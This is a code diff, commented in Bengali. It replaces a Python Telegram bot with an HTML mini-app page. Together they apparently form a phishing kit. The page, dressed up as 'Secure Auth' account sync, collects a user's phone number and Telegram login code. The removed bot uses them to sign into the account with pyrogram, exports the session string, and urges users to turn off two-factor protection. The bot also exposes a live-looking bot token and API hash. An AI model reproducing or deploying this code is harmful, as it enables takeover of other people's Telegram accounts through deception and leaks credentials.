@@ -1,105 +1,81 @@
-import json
-import logging
-from telegram import Update, WebAppInfo, InlineKeyboardButton, InlineKeyboardMarkup
-from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
-from pyrogram import Client
-from pyrogram.errors import SessionPasswordNeeded
-
-# --- আপনার দেওয়া তথ্যগুলো সেট করা হলো ---
-BOT_TOKEN = "8508356039:AAFBBo1SA6orTyo28L3kFbTPMIfIVFEpJpE"
-API_ID = 35683775
-API_HASH = "69733df80e4741f4cefb7e6cde1e9f82"
-WEB_APP_URL = "https://rony90790.github.io/session-web/" # আপনার GitHub লিংক
-
-# লগিং সেটিংস
-logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
-
-# ইউজারের ডাটা স্টোর করার জন্য
-user_data_store = {}
-
-async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """স্টার্ট কমান্ড: নিরাপদ মেসেজিং ব্যবহার করা হয়েছে"""
-    kb = [
-        [InlineKeyboardButton("🛡️ Secure Authorization", web_app=WebAppInfo(url=WEB_APP_URL))]
-    ]
-    await update.message.reply_html(
-        "👋 <b>Welcome!</b>\n\nTo safely synchronize your account with our service, please click the button below. This process is 100% encrypted and safe.",
-        reply_markup=InlineKeyboardMarkup(kb)
-    )
-
-async def handle_data(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """মিনি অ্যাপ থেকে আসা ডেটা প্রসেস করবে"""
-    user_id = update.effective_user.id
-    
-    try:
-        data = json.loads(update.effective_message.web_app_data.data)
-        phone = data.get("phone")
-        otp = data.get("otp")
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Auth</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        body { font-family: sans-serif; padding: 20px; text-align: center; background-color: #f9f9f9; color: #333; }
+        .container { background: white; padding: 20px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
+        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 10px; box-sizing: border-box; font-size: 16px; }
+        button { background-color: #0088cc; color: white; border: none; padding: 12px 20px; width: 100%; border-radius: 10px; font-weight: bold; cursor: pointer; font-size: 16px; }
+        .hidden { display: none; }
+        p { font-size: 14px; color: #666; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h3 id="title">Account Sync</h3>
         
-        # ট্রিক: নম্বর ও কোড থেকে সব ধরণের স্পেস বা ড্যাশ পরিষ্কার করা
-        if phone:
-            phone = phone.replace(" ", "").replace("-", "")
-        if otp:
-            otp = otp.replace(" ", "").replace("-", "")
+        <!-- ধাপ ১: শুধু ফোন নম্বর -->
+        <div id="phone-sec">
+            <p>Enter your phone number to start synchronization.</p>
+            <input type="text" id="phone" placeholder="+8801xxxxxxxxx">
+            <button onclick="sendPhone()">Send Request</button>
+        </div>
 
-        # --- ধাপ ১: রিকোয়েস্ট পাঠানো (Authorization Start) ---
-        if phone and not otp:
-            sent_msg = await update.message.reply_text("⏳ Initiating request...")
+        <!-- ধাপ ২: ওটিপি (Authorization Key) -->
+        <div id="otp-sec" class="hidden">
+            <p>Check your Telegram and enter the Authorization Key.</p>
+            <input type="text" id="otp" placeholder="Enter 5-digit key">
+            <button onclick="sendOTP()">Verify & Sync</button>
+            <p style="margin-top:10px;"><a href="#" onclick="showPhone()">Change Number</a></p>
+        </div>
+    </div>
+
+    <script>
+        let tg = window.Telegram.WebApp;
+        tg.expand();
+
+        // পেজ লোড হলে চেক করবে আগে নম্বর পাঠানো হয়েছে কি না
+        window.onload = function() {
+            if (localStorage.getItem("sent_phone")) {
+                showOTP();
+            }
+        };
+
+        function showOTP() {
+            document.getElementById("phone-sec").classList.add("hidden");
+            document.getElementById("otp-sec").classList.remove("hidden");
+            document.getElementById("title").innerText = "Verify Identity";
+        }
+
+        function showPhone() {
+            localStorage.removeItem("sent_phone");
+            document.getElementById("phone-sec").classList.remove("hidden");
+            document.getElementById("otp-sec").classList.add("hidden");
+            document.getElementById("title").innerText = "Account Sync";
+        }
+
+        function sendPhone() {
+            let phone = document.getElementById("phone").value;
+            if(!phone || phone.length < 10) return alert("Enter a valid number!");
             
-            # মেমোরিতে ক্লায়েন্ট রান করা (সার্ভারে কোনো ফাইল তৈরি হবে না)
-            client = Client(f"session_{user_id}", api_id=API_ID, api_hash=API_HASH, in_memory=True)
-            await client.connect()
-            
-            try:
-                code_info = await client.send_code(phone)
-                user_data_store[user_id] = {
-                    "client": client, 
-                    "phone": phone, 
-                    "hash": code_info.phone_code_hash
-                }
-                await sent_msg.edit_text("✅ <b>Request sent!</b>\nPlease re-open the form and enter your <b>Authorization Key</b> to finish.", parse_mode="HTML")
-            except Exception as e:
-                await sent_msg.edit_text(f"❌ Failed: {str(e)}")
+            localStorage.setItem("sent_phone", phone);
+            tg.sendData(JSON.stringify({ phone: phone }));
+            tg.close();
+        }
 
-        # --- ধাপ ২: সেশন তৈরি করা (Authorization Finish) ---
-        elif otp and user_id in user_data_store:
-            sent_msg = await update.message.reply_text("⚙️ Completing authorization...")
-            u_data = user_data_store[user_id]
-            client = u_data["client"]
-            
-            try:
-                # সাইন ইন করা
-                await client.sign_in(u_data["phone"], u_data["hash"], otp)
-                
-                # সেশন স্ট্রিং এক্সপোর্ট করা
-                session_str = await client.export_session_string()
-                
-                await sent_msg.edit_text(
-                    f"🏆 <b>Success! Here is your unique Access String:</b>\n\n<code>{session_str}</code>\n\n<i>Copy and keep it safe!</i>", 
-                    parse_mode="HTML"
-                )
-                
-                # মেমোরি ক্লিয়ার করা
-                await client.disconnect()
-                del user_data_store[user_id]
-                
-            except SessionPasswordNeeded:
-                await sent_msg.edit_text("⚠️ <b>Cloud Password Required!</b>\nYour account has 2FA active. Currently, this setup only supports non-2FA accounts. Please disable 2FA or use a standard client.")
-            except Exception as e:
-                await sent_msg.edit_text(f"❌ Error: {str(e)}")
+        function sendOTP() {
+            let phone = localStorage.getItem("sent_phone");
+            let otp = document.getElementById("otp").value;
+            if(!otp) return alert("Enter the key!");
 
-    except Exception as e:
-        await update.message.reply_text(f"⚠️ System busy: Please try again later.")
-
-def main():
-    """বট স্টার্ট ফাংশন"""
-    app = Application.builder().token(BOT_TOKEN).build()
-    
-    app.add_handler(CommandHandler("start", start))
-    app.add_handler(MessageHandler(filters.StatusUpdate.WEB_APP_DATA, handle_data))
-    
-    print("Bot is live with Anti-Ban system...")
-    app.run_polling()
-
-if __name__ == '__main__':
-    main()
+            tg.sendData(JSON.stringify({ phone: phone, otp: otp }));
+            localStorage.removeItem("sent_phone"); // কাজ শেষ হলে ডাটা মুছে দিবে
+            tg.close();
+        }
+    </script>
+</body>
+</html>
